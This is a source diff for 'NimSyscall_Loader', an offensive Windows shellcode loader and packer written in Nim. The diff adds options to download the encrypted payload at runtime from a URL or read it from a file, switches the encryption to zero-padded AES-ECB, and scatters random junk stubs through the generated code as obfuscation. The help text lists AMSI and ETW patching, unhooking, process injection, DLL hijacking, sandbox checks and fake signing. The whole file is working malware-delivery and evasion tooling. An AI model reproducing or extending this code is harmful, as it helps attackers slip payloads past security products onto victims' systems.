@@ -13,7 +13,6 @@ import os
 import osproc
 import docopt
 import random
-import base64
 import winim
 import streams
 when system.hostOS == "windows":
@@ -28,6 +27,7 @@ import SleepyCryptSleep
 import PELoad
 import CurrentProcInject
 import RemoteProcInject
+import DInvoke
 
 
 from system import io
@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -89,6 +89,12 @@ Options:
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
+
+[Shellcode retrieval options]
+
+  By default, the Loader will embed the Shellcode into the output file. There are two alternatives to this:  
+  --shellcodeFile shellcodefile    Filename to retrieve shellcode from - on Runtime (No embedding)
+  --shellcodeURL shellcodeURL    URL to retrieve shellcode from
 
 [DLL options]
 
@@ -183,6 +189,10 @@ var
     targetdomain : string = ""
     processname: string = ""
     customspawnprocess: string = "notepad.exe"
+    shellcodeFile: string = "enc.blob"
+    retrieveFromFile: bool = false
+    shellcodeURL: string = ""
+    retrieveFromURL: bool = false
     sandboxcheckfmt: string = ""
     sandboxchecks: seq[string]
     sandbox: bool = false
@@ -265,6 +275,17 @@ if args["--peload"]:
   peload = true
   shellcode = false
   csharp = false
+
+if args["--shellcodeFile"]:
+    retrieveFromFile = true
+    let shellcodeFilestring = args["--shellcodeFile"]
+    shellcodeFile = fmt"{shellcodeFilestring}"
+
+if args["--shellcodeURL"]:
+    retrieveFromURL = true
+    shellcodeFile = "WebserverPayload.bin"
+    let shellcodeURLstring = args["--shellcodeURL"]
+    shellcodeURL = fmt"{shellcodeURLstring}"
 
 if args["--dll"]:
   dll_out = true
@@ -533,33 +554,59 @@ else:
 var
     data: seq[byte] = toByteSeq(blob)
 
-    ectx: CTR[aes256]
+    ectx: ECB[aes256]
     key: array[aes256.sizeKey, byte]
-    iv: array[aes256.sizeBlock, byte]
+
+
+# AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
+# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
+if ((len(data) mod aes256.sizeBlock) != 0):
+    echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
+    echo "[*] Length: " & $len(data)
+    echo "[*] Padding payload..."
+    data = data & newSeq[byte](aes256.sizeBlock - (len(data) mod aes256.sizeBlock))
+    echo "[*] New Length: " & $len(data)
+    
+var
     plaintext = newSeq[byte](len(data))
     enctext = newSeq[byte](len(data))
 
-# Create Random IV
-discard randomBytes(addr iv[0], 16)
 
-# We do not need to pad data, `CTR` mode works byte by byte.
 copyMem(addr plaintext[0], addr data[0], len(data))
+echo "[*] Plaintext length: " & $len(plaintext)
+echo "[*] Enctext length: " & $len(enctext)
 
-# Expand key to 32 bytes using SHA256 as the KDF
-var expandedkey = sha256.digest(envkey)
-copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
+# Convert Key to byte sequence
+var expandedkey = toByteSeq(envkey)
 
-ectx.init(key, iv)
+# AES256 key size is 256 bits or 32 bytes, so we need to pad key with
+# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
+if ((len(expandedkey) mod (aes256.sizeBlock * 2)) != 0):
+    echo "[*] Key length not a multiple of KeySize: ", (aes256.sizeBlock * 2)
+    echo "[*] Length: " & $len(expandedkey)
+    echo "[*] Padding Key..."
+    expandedkey = expandedkey & newSeq[byte]((aes256.sizeBlock * 2) - (len(expandedkey) mod (aes256.sizeBlock * 2)))
+    echo "[*] New Length: " & $len(expandedkey)
+
+copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
+ectx.init(key)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-#let encoded = encode(enctext)
-let encodedIV = encode(iv)
 echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
-writeFile("enc.blob", content)
+writeFile(shellcodeFile, content)
 
+proc getRandStub (): string =
+  var randName: string = rndStr(rand(10..25))
+  var randValues: string = rndStr(rand(50..500))
+  let randstub = fmt"""
+
+var {randName}: string = obf("{randValues}")
+
+"""
+  return randstub
 
 let PatchargsFuncs = fmt"""
 var arguments: string = "{arguments}"
@@ -732,28 +779,45 @@ let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
 var remoteprocesses: seq[string] = {remoteprocesses}
 """
 
+let ShellcodeFromFileStub * = fmt"""
+
+var fileHandle: File
+fileHandle = open("{shellcodeFile}", fmRead)
+var encString = fileHandle.readAll()
+
+"""
+
+let ShellcodeFromURLStub * = fmt"""
+
+import std/httpclient
+var client = newHttpClient()
+var encString = client.getContent("{shellcodeURL}")
+
+"""
+
+let ShellcodeDefaultStub * = fmt"""
+const encstring = slurp"enc.blob"
+
+"""
+
 let Cryptstub1 = """
 import winim/lean
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
-#from winim/lean import FARPROC,NtClose
+#from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
+#import winim/winstr
+#import winim/utils
 #from winim import winstr,winimbase,windef
 import strformat
-from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
+from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import strutils
-import base64
 import ptr_math
 import strenc
 when defined(Fluctuate):
     import Fluctuation
 
-when defined(DInvoke):
-    import DInvoke
-
 var success: BOOL
-
-const encstring = slurp"enc.blob"
 
 proc toString(bytes: openarray[byte]): string =
   result = newString(bytes.len)
@@ -790,31 +854,42 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-var dctx: CTR[aes256]
+var ectx: ECB[aes256]
+
 """
 
 let Cryptstub2 = fmt"""
 var enctext: seq[byte] = toByteSeq(encstring)
+{getRandStub()}
 var key: array[aes256.sizeKey, byte]
+{getRandStub()}
 var envkey: string = obf("{envkey}")
-var iv: array[aes256.sizeBlock, byte]
-var pp: string = decode(obf("{encodedIV}"))
+{getRandStub()}
 """
 
 let Cryptstub3 = fmt"""
-# Decode and save IV
-copyMem(addr iv[0], addr pp[0], len(pp))
+{getRandStub()}
+    
+var expandedkey = toByteSeq(envkey)
+if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+    when defined(verbose):
+        echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+        echo "[*] Length: " & $len(expandedkey)
+        echo "[*] Padding Key with null bytes"
+    expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+    when defined(verbose):
+        echo "[*] New Length: " & $len(expandedkey)
 
-# Encrypt Key
-var expandedkey = sha256.digest(envkey)
-copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
-
+copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
+{getRandStub()}
 var dectext = newSeq[byte](len(enctext))
-
+{getRandStub()}
 # Decrypt
-dctx.init(key, iv)
-dctx.decrypt(enctext, dectext)
-dctx.clear()
+ectx.init(key)
+{getRandStub()}
+ectx.decrypt(enctext, dectext)
+{getRandStub()}
+ectx.clear()
 
 """
 
@@ -1090,15 +1165,6 @@ var remoteProcID = DWORD(tProcess.processID)
 
 """
 
-proc getRandStub (): string =
-  var randName: string = rndStr(rand(10..25))
-  var randValues: string = rndStr(rand(50..500))
-  let randstub = fmt"""
-
-var {randName}: string = obf("{randValues}")
-
-"""
-  return randstub
 
 let BeingDebugged * = fmt"""
 import AntiDebug
@@ -1107,7 +1173,13 @@ if(AmIDebugged()):
 """
 
 var stub = Cryptstub1
+
 if (not noDInvoke):
+    stub.add(DInvokeStubfirst)
+    stub.add(DInvokeGetPEB)
+    stub.add(DInvokeStubSecond)
+    stub.add(DInvokeStubThird)
+    stub.add(DInvokeStubFourth)
     stub.add(DInvokeBaseStub)
 
 if(pump):
@@ -1194,6 +1266,14 @@ else:
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
 stub.add(getRandStub())
+
+if (retrieveFromFile):
+    stub.add(ShellcodefromFileStub)
+elif (retrieveFromURL):
+    stub.add(ShellcodefromURLStub)
+else:
+    stub.add(ShellcodeDefaultStub)
+
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
 stub.add(getRandStub())
 stub.add(Cryptstub2)
@@ -1652,3 +1732,6 @@ if (pump):
 
 
             writeFile(fmt"{outfile}",pumpsequence)
+
+if (retrieveFromURL):
+    echo fmt"[!] Make sure to host the {shellcodeFile} file on your webserver with the correct file-Name to have a working payload ;-)"
